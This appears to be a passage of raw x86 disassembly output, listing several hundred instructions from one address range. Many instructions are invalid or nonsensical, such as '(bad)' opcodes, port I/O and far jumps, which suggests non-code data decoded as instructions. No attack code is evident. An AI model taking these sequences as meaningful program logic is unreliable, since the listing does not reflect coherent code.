  49260d:	xor    eax,0x37143610
  492612:	out    dx,eax
  492613:	mov    al,0xf
  492615:	aaa    
  492616:	sbb    BYTE PTR [ebx],al
  492618:	scas   eax,DWORD PTR es:[edi]
  492619:	xor    bl,BYTE PTR [edx+ebp*1]
  49261c:	add    dh,BYTE PTR [ebp+ebp*2+0x72]
  492620:	inc    ebx
  492621:	push   ds
  492622:	jnp    0x4925ec
  492624:	xor    DWORD PTR [eax],esp
  492626:	xor    esp,DWORD PTR [edx*1+0xf212834]
  49262d:	jns    0x4925f7
  49262f:	xor    eax,0x3730362c
  492634:	xor    al,0x36
  492636:	mov    eax,0x3838e43c
  49263b:	cmp    DWORD PTR [eax*1+0x4e403075],edi
  492642:	jb     0x4925d6
  492644:	rcl    DWORD PTR [edi],cl
  492646:	xor    DWORD PTR [edx+esi*1+0x48],eax
  49264a:	xor    ecx,DWORD PTR [edi+eiz*1+0x39]
  49264e:	leave  
  49264f:	dec    ecx
  492650:	xor    al,0x50
  492652:	xor    eax,0xe6583654
  492657:	popf   
  492658:	in     al,0x24
  49265a:	aaa    
  49265b:	pop    esp
  49265c:	cmp    BYTE PTR [eax-0x14],ah
  49265f:	add    edi,DWORD PTR ds:0x62fbcdf6
  492665:	je     0x4926d5
  492667:	xor    DWORD PTR [esp+edx*1+0x4],esp
  49266b:	gs fs je 0x4926a0
  49266f:	push   0x3c6c322b
  492674:	in     al,0x21
  492676:	(bad)  
  492677:	adc    eax,0x74347033
  49267c:	xor    eax,0x90f21e78
  492681:	xchg   DWORD PTR [esi],esi
  492683:	jl     0x4926bc
  492685:	cmp    BYTE PTR [eax],0x84
  492688:	imul   ebp,DWORD PTR [ebx],0x883943df
  49268e:	fild   DWORD PTR ds:0x3f178c30
  492694:	daa    
  492695:	cmp    ecx,ecx
  492697:	xor    DWORD PTR [eax-0x67cc6bce],edx
  49269d:	add    eax,0xe18f0b00
  4926a2:	xor    DWORD PTR [eax],ecx
  4926a4:	and    DWORD PTR [ecx],esi
  4926a6:	pushf  
  4926a7:	out    0x32,eax
  4926a9:	mov    al,ds:0x630524ec
  4926ae:	push   ecx
  4926af:	in     al,dx
  4926b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4926b1:	cmp    DWORD PTR [eax-0x6c6d8de9],ebp
  4926b7:	jl     0x4926eb
  4926b9:	xor    BYTE PTR [ecx+esi*1+0x39b432b0],ch
  4926c0:	leave  
  4926c1:	dec    ecx
  4926c2:	dec    esi
  4926c3:	xor    edi,DWORD PTR [eax-0x3fca43cc]
  4926c9:	neg    al
  4926cb:	arpl   WORD PTR [edi],sp
  4926cd:	ss (bad) 
  4926cf:	in     eax,dx
  4926d0:	xor    ecx,eax
  4926d2:	adc    eax,0xec43cc34
  4926d7:	and    al,0xa7
  4926d9:	popf   
  4926da:	aaa    
  4926db:	rcl    BYTE PTR [edi],1
  4926dd:	cmp    ah,dl
  4926df:	cmp    eax,ebx
  4926e1:	pop    ebp
  4926e2:	test   DWORD PTR [ebp+0x14357a05],ecx
  4926e8:	inc    esp
  4926e9:	mov    al,ds:0x6b3423f
  4926ee:	or     DWORD PTR [edi],ecx
  4926f0:	arpl   WORD PTR [ecx],cx
  4926f2:	push   ds
  4926f3:	fdivr  st,st(0)
  4926f5:	mov    ah,0x71
  4926f7:	je     0x492739
  4926f9:	inc    ebp
  4926fa:	xchg   edi,eax
  4926fb:	cld    
  4926fc:	xor    dh,BYTE PTR [edx+0x783ef379]
  492702:	inc    eax
  492703:	xor    dl,BYTE PTR [ecx]
  492705:	add    BYTE PTR [edx+eax*2-0x2f0e4f4d],cl
  49270c:	or     ch,BYTE PTR [edi]
  49270e:	in     eax,dx
  49270f:	and    BYTE PTR [esi+ebx*1+0x78],ch
  492713:	adc    BYTE PTR [bp+0x61],al
  492717:	imul   esp,DWORD PTR [edx-0x3361ac4c],0xd0338c9e
  492721:	push   esp
  492722:	xor    DWORD PTR [eax+edi*2],0x55
  492726:	sub    eax,0x314e4ec3
  49272b:	mov    BYTE PTR [ecx],ah
  49272d:	xor    al,0x91
  49272f:	aaa    
  492730:	mov    esi,DWORD PTR [ebx-0x28aa0b9e]
  492736:	pop    ds
  492737:	pusha  
  492738:	push   esi
  492739:	enter  0x9393,0x93
  49273d:	xor    ecx,esp
  49273f:	xor    al,0x38
  492741:	push   edi
  492742:	in     al,0xc9
  492744:	leave  
  492745:	leave  
  492746:	xor    eax,0x581036a4
  49274b:	dec    esi
  49274c:	dec    esi
  49274d:	cs data16 aaa 
  492750:	jl     0x49278a
  492752:	call   0x4e54f132
  492757:	cmp    DWORD PTR [ecx],esp
  492759:	push   esp
  49275a:	pop    ecx
  49275b:	xor    BYTE PTR [ecx],ah
  49275d:	inc    ebx
  49275e:	xlat   BYTE PTR ds:[ebx]
  49275f:	gs nop
  492761:	shl    BYTE PTR [ebx],0x15
  492764:	sbb    BYTE PTR [edx+0x4a],0x3b
  492768:	xchg   ebp,eax
  492769:	lea    ecx,[ecx+0xe]
  49276c:	aas    
  49276d:	push   es
  49276e:	push   esp
  49276f:	pop    ds
  492770:	stos   DWORD PTR es:[edi],eax
  492771:	ins    DWORD PTR es:[edi],dx
  492772:	inc    edx
  492773:	mov    al,0x31
  492775:	push   es
  492776:	(bad)  
  492778:	adc    al,0x5d
  49277a:	push   cs
  49277b:	mov    al,0xd9
  49277d:	ins    BYTE PTR es:[edi],dx
  49277e:	push   es
  49277f:	aam    0x9c
  492781:	mov    ah,0x79
  492783:	ins    BYTE PTR es:[edi],dx
  492784:	outs   dx,BYTE PTR ds:[esi]
  492785:	jo     0x4927a1
  492787:	mov    al,0x75
  492789:	inc    eax
  49278a:	xor    edx,eax
  49278c:	inc    eax
  49278d:	xchg   edi,eax
  49278e:	pop    es
  49278f:	push   ecx
  492790:	inc    esi
  492791:	sub    eax,DWORD PTR [eax+0x1f]
  492794:	into   
  492795:	call   0xe39ef0fc
  49279a:	sub    al,0x97
  49279c:	xchg   ecx,eax
  49279d:	not    BYTE PTR [edx]
  49279f:	xchg   BYTE PTR [ebp-0x299c3647],ah
  4927a5:	pop    eax
  4927a6:	call   DWORD PTR [ebx]
  4927a8:	or     bl,BYTE PTR [eax+ebp*4+0x43]
  4927ac:	pop    eax
  4927ad:	retf   0x5560
  4927b0:	mov    DWORD PTR ds:0x375af926,esp
  4927b6:	cmp    al,0x60
  4927b8:	pop    eax
  4927b9:	add    ebx,ebp
  4927bb:	sub    eax,0xdd5c3851
  4927c0:	clc    
  4927c1:	mov    edx,0x2257384c
  4927c6:	lea    eax,[ebx+0x3a]
  4927c9:	push   ebx
  4927ca:	or     al,bh
  4927cc:	or     ebp,edi
  4927ce:	xor    edx,0x138dd6db
  4927d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4927d5:	les    eax,FWORD PTR [ecx-0x4b8fce30]
  4927db:	cmp    BYTE PTR [ebx+0x241983fc],0xc
  4927e2:	mov    BYTE PTR [ebp-0x15935f74],bh
  4927e8:	push   cs
  4927e9:	ror    BYTE PTR [ebp+0x12786860],cl
  4927ef:	jmp    0x26c091ba
  4927f4:	xchg   esp,eax
  4927f5:	push   cs
  4927f6:	jbe    0x492858
  4927f8:	mov    bl,0x25
  4927fa:	xor    DWORD PTR [ebx],edx
  4927fc:	mov    eax,0x855c1f95
  492801:	push   ds
  492802:	add    al,0xb3
  492804:	mov    bl,0xfb
  492806:	loopne 0x492848
  492808:	lea    ebp,[ecx-0x46]
  49280b:	lods   al,BYTE PTR ds:[esi]
  49280c:	pop    esp
  49280d:	sub    eax,0x254c4820
  492812:	xchg   ebp,eax
  492813:	test   BYTE PTR [ecx-0x6a],0x61
  492817:	clc    
  492818:	ds pop eax
  49281a:	les    esp,FWORD PTR ds:0x25206e4b
  492820:	push   0x54
  492822:	fadd   DWORD PTR [ebp-0x35]
  492825:	adc    DWORD PTR [ebx+0x6b],eax
  492828:	fs pop edx
  49282a:	repnz loopne 0x49286b
  49282d:	sbb    ebx,DWORD PTR [eax+0x16]
  492830:	mov    WORD PTR [edx-0x24],ds
  492833:	and    dh,BYTE PTR [ecx+0xd60177f]
  492839:	je     0x492844
  49283b:	mov    ds,ecx
  49283d:	mov    esi,0x9e281ba4
  492842:	daa    
  492843:	or     al,0x20
  492845:	dec    esi
  492846:	push   esp
  492847:	push   ebp
  492848:	or     edx,esi
  49284a:	out    0x2d,eax
  49284c:	das    
  49284d:	adc    ah,BYTE PTR [edi]
  49284f:	xor    edi,DWORD PTR [ebx]
  492851:	inc    ebp
  492852:	lds    ecx,FWORD PTR [ebp-0x1e]
  492855:	jb     0x49281f
  492857:	sbb    dh,BYTE PTR [edi]
  492859:	push   cs
  49285a:	adc    BYTE PTR [eax],dh
  49285c:	pop    ss
  49285d:	cmp    BYTE PTR [ecx],0x56
  492860:	jmp    0xa4288ef5
  492865:	das    
  492866:	(bad)  
  492868:	sbb    eax,0x640090da
  49286d:	mov    ebx,0xb10d651f
  492872:	out    dx,eax
  492873:	pop    esi
  492874:	mov    cl,BYTE PTR [ecx+0x64]
  492877:	push   0xe
  492879:	add    BYTE PTR [edx-0x51],dh
  49287c:	mov    ebx,0xde2e0d8
  492881:	(bad)  
  492883:	(bad)  
  492884:	setp   BYTE PTR [ebp-0x18]
  492888:	dec    eax
  492889:	cwde   
  49288a:	and    al,BYTE PTR [eax*1-0x64591b00]
  492891:	fst    QWORD PTR [esi-0x283dfe5b]
  492897:	pop    esi
  492898:	mov    bh,0x16
  49289a:	or     DWORD PTR [ebp+0x777f10a0],ebx
  4928a0:	or     BYTE PTR [ebx+0x1e],al
  4928a3:	test   eax,0x3d5a44fc
  4928a8:	or     DWORD PTR [ebp+0x545f4443],ecx
  4928ae:	sar    BYTE PTR [edi+0x39],1
  4928b1:	aam    0xb2
  4928b3:	(bad)  
  4928b4:	push   ebp
  4928b5:	cld    
  4928b6:	std    
  4928b7:	test   DWORD PTR [ecx+0x3d],esp
  4928ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4928bb:	and    DWORD PTR [esp+eiz*8],eax
  4928be:	cld    
  4928bf:	daa    
  4928c0:	add    BYTE PTR [ebp+0x25],dh
  4928c3:	pusha  
  4928c4:	xor    bl,al
  4928c6:	or     DWORD PTR [edi-0x9],ebx
  4928c9:	mov    eax,ds:0x6a546af5
  4928ce:	sub    BYTE PTR [ebx+0x40109fd8],dl
  4928d4:	or     al,BYTE PTR [ebx+0x8]
  4928d7:	dec    ecx
  4928d8:	push   edx
  4928d9:	inc    ebp
  4928da:	mov    edx,0x681b6eb3
  4928df:	clc    
  4928e0:	cmp    eax,0x8c08356e
  4928e5:	sbb    esp,ecx
  4928e7:	dec    ebp
  4928e8:	mov    ah,0xe8
  4928ea:	push   cs
  4928eb:	retf   
  4928ec:	or     edx,DWORD PTR [ebx+edx*1+0x21c14549]
  4928f3:	mov    WORD PTR [eax-0x17],cs
  4928f6:	in     al,0x1c
  4928f8:	iret   
  4928f9:	sar    DWORD PTR [ecx],1
  4928fb:	pop    eax
  4928fc:	ret    0x81ef
  4928ff:	adc    al,0xee
  492901:	mov    al,ds:0xcd4bdde
  492906:	mov    bh,0xaf
  492908:	push   0xc80950c6
  49290d:	xchg   ecx,eax
  49290e:	clc    
  49290f:	and    al,0x45
  492911:	and    eax,0xe2fe16a5
  492916:	je     0x49294a
  492918:	test   BYTE PTR [eax-0x35],dl
  49291b:	aam    0x6e
  49291d:	outs   dx,DWORD PTR ds:[esi]
  49291e:	push   es
  49291f:	mov    al,0x7c
  492921:	xchg   BYTE PTR [edi],bh
  492923:	mov    eax,0x7bb4b972
  492928:	mov    dl,0xc0
  49292a:	adc    al,0xa
  49292c:	mov    eax,0x9d64d0bc
  492931:	retf   
  492932:	in     eax,0xc4
  492934:	int3   
  492935:	enter  0x43a8,0x9e
  492939:	or     bl,ch
  49293b:	lea    edi,[edi]
  49293d:	inc    ebp
  49293e:	rcl    bh,cl
  492940:	aam    0x74
  492942:	in     al,0x81
  492944:	push   es
  492945:	and    al,0xa
  492947:	lock inc esp
  492949:	aam    0x5c
  49294b:	lea    ebx,[ebp+edx*4+0x137528ac]
  492952:	push   ds
  492953:	ins    BYTE PTR es:[edi],dx
  492954:	xor    ah,al
  492956:	aam    0x30
  492958:	dec    dh
  49295a:	das    
  49295b:	push   ebp
  49295c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49295d:	xchg   DWORD PTR [ebp+esi*2-0x28],eax
  492961:	enter  0xf8f5,0x77
  492965:	dec    eax
  492966:	in     eax,0x90
  492968:	add    al,0xc8
  49296a:	int3   
  49296b:	int3   
  49296c:	and    DWORD PTR [eax],esp
  49296e:	jo     0x492956
  492970:	enter  0x6fd0,0xc0
  492974:	adc    eax,0x4bbd61fc
  492979:	jo     0x4929aa
  49297b:	adc    DWORD PTR [eax],ebp
  49297d:	sbb    ebp,DWORD PTR [eax+eax*4-0x4c]
  492981:	sub    ebx,ebx
  492983:	dec    edx
  492984:	mov    ah,0xbc
  492986:	sub    ecx,DWORD PTR [esi]
  492988:	fs fs fcmovb st,st(0)
  49298c:	xchg   ebx,eax
  49298d:	sar    BYTE PTR [eax-0x77d8cb48],0x43
  492994:	jne    0x4929c6
  492996:	dec    eax
  492997:	fcomp  QWORD PTR [ecx-0x53]
  49299a:	xchg   ebx,eax
  49299b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49299c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49299d:	je     0x4929f4
  49299f:	clc    
  4929a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4929a1:	and    DWORD PTR [eax-0x5a073fb7],0x69c8ebc0
  4929ab:	popa   
  4929ac:	in     al,dx
  4929ad:	fadd   DWORD PTR [eax+0x56]
  4929b0:	push   ebp
  4929b1:	jns    0x492a06
  4929b3:	inc    edx
  4929b4:	in     eax,dx
  4929b5:	stos   DWORD PTR es:[edi],eax
  4929b6:	xchg   esp,eax
  4929b7:	aas    
  4929b8:	mov    eax,0x121f204c
  4929bd:	retf   0xe007
  4929c0:	retf   
  4929c1:	adc    al,0x56
  4929c3:	dec    esp
  4929c4:	pop    fs
  4929c6:	enter  0xd203,0x4f
  4929ca:	fmul   QWORD PTR [edi+0x40]
  4929cd:	inc    ebp
  4929ce:	inc    esi
  4929cf:	xor    DWORD PTR [ebp+0xd],eax
  4929d2:	outs   dx,BYTE PTR ds:[esi]
  4929d3:	enter  0x503,0x24
  4929d7:	cmc    
  4929d8:	sbb    cl,BYTE PTR [edi+0x2d3c04c8]
  4929de:	dec    ebp
  4929df:	add    DWORD PTR [esi+ebp*8],ebp
  4929e2:	sbb    DWORD PTR [ecx],ebp
  4929e4:	sbb    ch,BYTE PTR [ecx+0x76]
  4929e7:	xor    edi,esp
  4929e9:	mov    ecx,0xf05b0e10
  4929ee:	and    al,0xd
  4929f0:	push   edx
  4929f1:	add    al,BYTE PTR [eax]
  4929f3:	into   
  4929f4:	mov    ds:0x67651295,eax
  4929f9:	int    0xfd
  4929fb:	or     DWORD PTR [eax+0x20],edi
  4929fe:	and    DWORD PTR ds:0x6e7e4c1,eax
  492a04:	push   0xffffffdc
  492a06:	mov    ecx,0x45406402
  492a0b:	add    BYTE PTR [eax+0x16],ah
  492a0e:	lock inc edx
  492a10:	cmp    eax,0xfffffff9
  492a13:	push   es
  492a14:	adc    al,0x4
  492a16:	out    dx,al
  492a17:	push   esi
  492a18:	jmp    FWORD PTR ds:[eax+0x65]
  492a1c:	jg     0x4929d6
  492a1e:	pop    es
  492a1f:	and    eax,0x2e253a64
  492a24:	xor    cl,BYTE PTR [ecx]
  492a26:	push   eax
  492a27:	sbb    cl,BYTE PTR [ebx+0x61]
  492a2a:	pop    ebx
  492a2b:	add    BYTE PTR [esi-0x3e],cl
  492a2e:	fiadd  WORD PTR [ecx]
  492a30:	push   es
  492a31:	in     al,dx
  492a32:	mov    cl,0x2e
  492a34:	or     BYTE PTR [eax-0x679ec40],bh
  492a3a:	sub    edx,DWORD PTR [eax+0x17dcd8]
  492a40:	pop    ecx
  492a41:	js     0x4929d5
  492a43:	sub    edi,DWORD PTR [ecx+0x1f]
  492a46:	xchg   ebx,eax
  492a47:	es in  al,0xf0
  492a4a:	(bad)  
  492a4b:	out    dx,eax
  492a4c:	test   DWORD PTR [eax+eax*1+0x22106842],edi
  492a53:	push   0x27
  492a55:	in     al,0x4a
  492a57:	scas   al,BYTE PTR es:[edi]
  492a58:	in     al,0x24
  492a5a:	cmp    BYTE PTR [eax-0x37],dl
  492a5d:	push   esp
  492a5e:	pop    ebx
  492a5f:	scas   al,BYTE PTR es:[edi]
  492a60:	pusha  
  492a61:	(bad)  
  492a62:	push   0x4f043034
  492a67:	mov    eax,0x13cb427c
  492a6c:	lods   al,BYTE PTR ds:[esi]
  492a6d:	xor    al,0x85
  492a6f:	fnstsw WORD PTR [edi]
  492a71:	dec    ebp
  492a72:	dec    ecx
  492a73:	xchg   ebp,eax
  492a74:	cwde   
  492a75:	sub    al,0x19
  492a77:	inc    esp
  492a78:	add    edx,DWORD PTR [esi+0x2e]
  492a7b:	popa   
  492a7c:	not    BYTE PTR ds:0x1846974
  492a82:	xor    eax,0x72392806
  492a87:	push   edi
  492a88:	inc    edx
  492a89:	sar    BYTE PTR [ebx+0x652e7936],1
  492a8f:	js     0x492ac8
  492a91:	sbb    BYTE PTR [eax+0x42],bl
  492a94:	ret    
  492a95:	xor    cl,dl
  492a97:	dec    ebp
  492a98:	inc    ecx
  492a99:	jl     0x492a5b
  492a9b:	ss inc ebp
  492a9d:	cs ins DWORD PTR es:[di],dx
  492aa0:	add    ebp,DWORD PTR [edx-0x21]
  492aa3:	fisttp WORD PTR [edx-0x1d110f31]
  492aa9:	out    dx,al
  492aaa:	in     al,0xed
  492aac:	hlt    
  492aad:	xor    dl,dh
  492aaf:	xor    al,0x70
  492ab1:	(bad)  [ecx]
  492ab3:	aaa    
  492ab4:	jae    0x492a5e
  492ab6:	inc    edi
  492ab7:	and    BYTE PTR [edi+0x68],bh
  492aba:	ins    BYTE PTR es:[edi],dx
  492abb:	pop    edi
  492abc:	mov    cl,0xf7
  492abe:	jmp    FWORD PTR [edi-0x4f]
  492ac1:	push   edi
  492ac2:	outs   dx,BYTE PTR ds:[esi]
  492ac3:	cmp    eax,edx
  492ac5:	in     eax,0xe4
  492ac7:	loopne 0x492ab3
  492ac9:	repnz out dx,al
  492acb:	lock and al,dh
  492ace:	in     eax,0xe5
  492ad0:	icebp  
  492ad1:	repnz lock loopne 0x492a64
  492ad5:	in     eax,dx
  492ad6:	mov    ecx,0xe0cd6ffd
  492adb:	adc    ch,dh
  492add:	jmp    0xf16a0bcc
  492ae2:	call   0xfc36100d
  492ae7:	les    edx,FWORD PTR [edx]
  492ae9:	out    dx,eax
  492aea:	xchg   esi,eax
  492aeb:	add    bl,bl
  492aed:	mul    ch
  492aef:	repnz mul ebp
  492af2:	push   eax
  492af3:	out    0xe0,eax
  492af5:	(bad)  
  492af6:	mul    DWORD PTR [eax]
  492af8:	int    0x7e
  492afa:	pusha  
  492afb:	pop    ebp
  492afc:	fsin   
  492afe:	loopne 0x492ae1
  492b00:	out    dx,al
  492b01:	imul   eax
  492b03:	jmp    0xec37a128
  492b08:	iret   
  492b09:	repz icebp 
  492b0b:	cmp    dh,BYTE PTR [eax-0x3d709140]
  492b11:	sti    
  492b12:	out    dx,eax
  492b13:	and    BYTE PTR [edx+esi*8],al
  492b16:	cld    
  492b17:	aaa    
  492b18:	mov    dh,0xe4
  492b1a:	add    al,BYTE PTR [ecx+0x17]
  492b1d:	inc    edi
  492b1e:	or     eax,DWORD PTR [edi]
  492b20:	jge    0x492b37
  492b22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  492b23:	fdivr  DWORD PTR [esi+0x45279cc0]
  492b29:	dec    ecx
  492b2a:	push   esi
  492b2b:	mov    esi,0x64004490
  492b30:	pusha  
  492b31:	inc    ebx
  492b32:	pop    edx
  492b33:	es inc ebx
  492b35:	sbb    DWORD PTR [edx],esp
  492b37:	int3   
  492b38:	mov    ah,0x6a
  492b3a:	dec    edx
  492b3b:	sbb    cl,BYTE PTR gs:[ebp-0xe]
  492b3f:	sub    eax,esi
  492b41:	test   eax,0x8934e38c
  492b46:	cmc    
  492b47:	mov    eax,0xa47e3a6e
  492b4c:	dec    esi
  492b4d:	pushf  
  492b4e:	(bad)  
  492b4f:	ins    BYTE PTR es:[edi],dx
  492b50:	mov    eax,0xb8dd44a8
  492b55:	push   ss
  492b56:	fbld   TBYTE PTR [esi-0x78f60b82]
  492b5c:	add    eax,0xc4d8cc2c
  492b61:	outs   dx,DWORD PTR ds:[esi]
  492b62:	dec    esi
  492b63:	and    al,cl
  492b65:	inc    esp
  492b66:	inc    ebp
  492b67:	daa    
  492b68:	aam    0x24
  492b6a:	push   0x0
  492b6c:	add    edx,DWORD PTR [edi]
  492b6e:	jbe    0x492bef
  492b70:	mov    edi,DWORD PTR [eax+0x27]
  492b73:	push   es
  492b74:	test   DWORD PTR [ebx+0x69f5e57],edi
  492b7a:	mov    cl,0x1
  492b7c:	mov    edx,0x1a1a4ee4
  492b81:	call   0x4520:0xba567dbd
  492b88:	pop    ss
  492b89:	pop    ds
  492b8a:	test   BYTE PTR [ecx-0x34],al
  492b8d:	and    DWORD PTR [edi],ecx
  492b8f:	pop    edx
  492b90:	push   0xffffff97
  492b92:	xor    DWORD PTR [eax],0x45
  492b95:	add    eax,0xb9e7d872
  492b9a:	fs mov edx,0x1c208d74
  492ba0:	or     BYTE PTR [ecx-0x33738da4],ch
  492ba6:	in     al,0x80
  492ba8:	dec    edi
  492ba9:	ret    
  492baa:	jge    0x492b97
  492bac:	bound  edi,QWORD PTR [edx-0x6f48c90c]
  492bb2:	dec    DWORD PTR ds:0xa54419c4
  492bb8:	add    eax,0xb61dc4c9
  492bbd:	leave  
  492bbe:	and    bl,ah
  492bc0:	xchg   BYTE PTR ds:0x626b523b,dl
  492bc6:	jl     0x492b58
  492bc8:	xor    al,0xeb
  492bca:	es mov edx,0x2823440c
  492bd0:	cwde   
  492bd1:	push   cs
  492bd2:	add    DWORD PTR [esi],edx
  492bd4:	mov    esp,0x21b02fa0
  492bd9:	cmp    DWORD PTR [eax+0x642df906],edi
  492bdf:	adc    dh,BYTE PTR ss:[edx+0x38]
  492be3:	fst    QWORD PTR [edi+0x5d723844]
  492be9:	add    eax,0x5781de53
  492bee:	pop    ebp
  492bef:	add    DWORD PTR [ebp*4+0xc505c6f],0x50398b41
  492bfa:	dec    esi
  492bfb:	inc    edx
  492bfc:	add    al,0x90
  492bfe:	mov    ebx,0xe85331d7
  492c03:	aas    
  492c04:	mov    eax,0x525cd510
  492c09:	jne    0x492c79
  492c0b:	dec    edi
  492c0c:	outs   dx,BYTE PTR ds:[esi]
  492c0d:	arpl   WORD PTR [esi-0x1e],sp
  492c10:	stos   BYTE PTR es:[edi],al
  492c11:	and    al,0xc7
  492c13:	jne    0x492c7b
  492c15:	jg     0x492c3f
  492c17:	loopne 0x492c84
  492c19:	push   esi
  492c1a:	imul   ebx,DWORD PTR [edi],0x53597e29
  492c20:	push   esp
  492c21:	inc    ebp
  492c22:	dec    ebp
  492c23:	das    
  492c24:	call   0x2210:0x495c214a
  492c2b:	inc    edx
  492c2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  492c2d:	pop    ss
  492c2e:	loop   0x492c10
  492c30:	inc    eax
  492c31:	aaa    
  492c32:	ins    DWORD PTR es:[edi],dx
  492c33:	xor    edi,DWORD PTR fs:[edi-0x4d0cd8bf]
  492c3a:	test   eax,0xf908336c
  492c3f:	cs retf 
  492c41:	cmp    dh,BYTE PTR [ebx-0x7d68cab1]
  492c47:	and    edx,DWORD PTR [edx-0x3f]
  492c4a:	dec    edi
  492c4b:	jp     0x492ca2
  492c4d:	cwde   
  492c4e:	cdq    
  492c4f:	shr    BYTE PTR ds:0xaa104e32,1
  492c55:	pop    ebx
  492c56:	enter  0x4735,0x45
  492c5a:	das    
  492c5b:	add    eax,0x8435f55a
  492c60:	(bad)  
  492c61:	pop    edi
  492c62:	int    0xe5
  492c64:	loop   0x492cd4
  492c66:	in     eax,dx
  492c67:	sti    
  492c68:	cs cdq 
  492c6a:	jmp    0x5f21:0x2aea48aa
  492c71:	leave  
  492c72:	add    DWORD PTR [ebp+0x24],ecx
  492c75:	xchg   BYTE PTR [esi],al
  492c77:	sbb    BYTE PTR [ebx+esi*1+0x4e701162],al
  492c7e:	mov    edi,0x450fb8ca
  492c83:	cld    
  492c84:	cwde   
  492c85:	test   BYTE PTR [esi],bl
  492c87:	mov    ecx,0xe3621ab5
  492c8c:	add    BYTE PTR [esp+ebx*8],0x80
  492c90:	arpl   sp,bp
  492c92:	ret    
  492c93:	xor    DWORD PTR ds:0xbbd51627,eax
  492c99:	fist   DWORD PTR [ecx+0x5ac0ba71]
  492c9f:	sub    BYTE PTR [ecx],bh
  492ca1:	addr16 loope 0x492c9c
  492ca4:	scas   al,BYTE PTR es:[edi]
  492ca5:	sahf   
  492ca6:	adc    eax,0x77a45561
  492cab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  492cac:	sbb    al,0x90
  492cae:	fnstsw WORD PTR [eax+0x4fc8b7ec]
  492cb4:	clc    
  492cb5:	add    dh,BYTE PTR [eax]
  492cb7:	in     al,0x4e
  492cb9:	push   esi
  492cba:	outs   dx,BYTE PTR ds:[esi]
  492cbb:	inc    ebp
  492cbc:	call   0x1dea7cc5
  492cc1:	and    bl,BYTE PTR [edx]
  492cc3:	dec    esi
  492cc4:	mov    al,0x63
  492cc6:	jecxz  0x492c92
  492cc8:	add    ecx,ebx
  492cca:	std    
  492ccb:	enter  0xb8a8,0xf4
  492ccf:	mov    edx,DWORD PTR [eax+edx*2]
  492cd2:	rol    BYTE PTR [ebx],1
  492cd4:	cmp    DWORD PTR [eax-0x70b6f12],edx
  492cda:	inc    ebp
  492cdb:	push   eax
  492cdc:	aam    0xdb
  492cde:	ror    BYTE PTR [eax],1
  492ce0:	jb     0x492cda
  492ce2:	sub    ax,0xbd7e
  492ce6:	scas   eax,DWORD PTR es:[edi]
  492ce7:	pop    ebp
  492ce8:	mov    ebp,0xc5636030
  492ced:	leave  
  492cee:	stc    
  492cef:	mov    dh,0x9f
  492cf1:	out    dx,eax
  492cf2:	cs inc ecx
  492cf4:	test   al,0xba
  492cf6:	jo     0x492d48
  492cf8:	ins    DWORD PTR es:[edi],dx
  492cf9:	and    eax,0x95207204
  492cfe:	sub    DWORD PTR [eax],ecx
  492d00:	nop
  492d01:	mov    ah,0xe4
  492d03:	inc    eax
  492d04:	sub    dl,BYTE PTR [ebx+0xc]
  492d07:	mov    ah,0xb8
  492d09:	leave  
  492d0a:	adc    DWORD PTR [esi+eiz*4-0x40],0x39514cc
  492d12:	test   eax,0x28ec204c
  492d17:	add    al,0xac
  492d19:	pop    esp
  492d1a:	sbb    DWORD PTR [eax+0x232c51],edx
  492d20:	add    ah,dh
  492d22:	sbb    al,0xc9
  492d24:	mov    ah,0x23
  492d26:	xchg   ebx,eax
  492d27:	sub    bl,dh
  492d29:	hlt    
  492d2a:	dec    ebx
  492d2b:	adc    al,0xca
  492d2d:	ja     0x492d61
  492d2f:	leave  
  492d30:	inc    eax
  492d31:	mov    eax,0x2a30bdd0
  492d36:	push   ebx
  492d37:	cmp    edx,DWORD PTR [eax+0x34713424]
  492d3d:	test   al,0xdc
  492d3f:	(bad)  
  492d40:	outs   dx,BYTE PTR ds:[esi]
  492d41:	dec    ebx
  492d42:	and    eax,0x6925e340
  492d47:	jb     0x492cf9
  492d49:	ja     0x492d5b
  492d4b:	das    
  492d4c:	cmp    BYTE PTR [ebx-0x43],cl
  492d4f:	cmp    al,0xe5
  492d51:	inc    eax
  492d52:	sub    dl,BYTE PTR [ebx+0x3c]
  492d55:	nop
  492d56:	cmp    al,0x3
  492d58:	test   eax,0x3c10481c
  492d5d:	sub    eax,0x95207253
  492d62:	inc    eax
  492d63:	pop    eax
  492d64:	inc    esp
  492d65:	inc    esp
  492d66:	test   eax,0xa02a40e1
  492d6b:	inc    esp
  492d6c:	pop    edi
  492d6d:	dec    eax
  492d6e:	xchg   DWORD PTR [ebx-0x42b2da83],eax
  492d74:	dec    eax
  492d75:	cmp    DWORD PTR [eax+edx*4-0x36],esi
  492d79:	xchg   esp,eax
  492d7a:	sbb    al,0x4c
  492d7c:	dec    esp
  492d7d:	loopne 0x492d9f
  492d7f:	xchg   ebp,eax
  492d80:	sub    DWORD PTR [ecx],edi
  492d82:	dec    esp
  492d83:	dec    esp
  492d84:	inc    ecx
  492d85:	dec    edx
  492d86:	push   cs
  492d87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  492d88:	jb     0x492dda
  492d8a:	cwde   
  492d8b:	push   esp
  492d8c:	xchg   esp,eax
  492d8d:	sbb    al,0x48
  492d8f:	gs push esp
  492d91:	mov    BYTE PTR [edx+edx*2+0x39],dl
  492d95:	nop
  492d96:	retf   0x4f54
  492d99:	pop    eax
  492d9a:	mov    al,0xa4
  492d9c:	xor    ah,BYTE PTR ds:0x805c5c07
  492da2:	pusha  
  492da3:	pop    edi
  492da4:	dec    edx
  492da5:	push   cs
  492da6:	pop    esp
  492da7:	and    eax,0x1a96bd3a
  492dac:	enter  0xfcf3,0x2
  492db0:	enter  0x3996,0x90
  492db4:	retf   0x25c5
  492db7:	mov    al,0xdc
  492db9:	add    BYTE PTR [eax+0x20],dh
  492dbc:	xchg   ebp,eax
  492dbd:	sub    DWORD PTR [eax-0x68ab6b14],edx
  492dc3:	add    ebp,DWORD PTR [ecx+0x7b]
  492dc6:	cld    
